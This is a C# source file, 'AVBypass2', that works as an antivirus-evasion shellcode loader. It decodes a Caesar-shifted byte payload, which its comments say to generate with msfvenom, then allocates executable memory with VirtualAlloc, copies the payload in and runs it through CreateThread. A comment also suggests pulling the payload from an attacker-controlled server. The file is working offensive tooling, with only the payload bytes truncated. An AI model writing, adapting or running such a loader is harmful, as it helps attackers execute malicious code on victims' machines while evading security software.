using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace AVBypass2
{
    class AVBypass2
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Generate PIE shellcode (e.g. msfvenom) and obfuscate via caesar-chiffre +2 
            // Don't forget to adjust byte lenght according to your generated payload
            byte[] payload = new byte[2] { 0xfe, 0x4a /*[..]*/};

            // Alternative would be to download obfuscated payload via http from attacker controlled server and than deobfuscate it.

            // deobfuscate caesar-chiffre -2
            for(int i = 0; i < payload.Length; i++)
            {
                payload[i] = (byte)(((uint)payload[i] - 2) & 0xFF);
            }
            int size = payload.Length;

            // 1st Allocate memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // 2nd copy payload to memory
            Marshal.Copy(payload, 0, addr, size);

            // 3rd create thread within current process
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            // 4th wait until thread execution has been finished
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
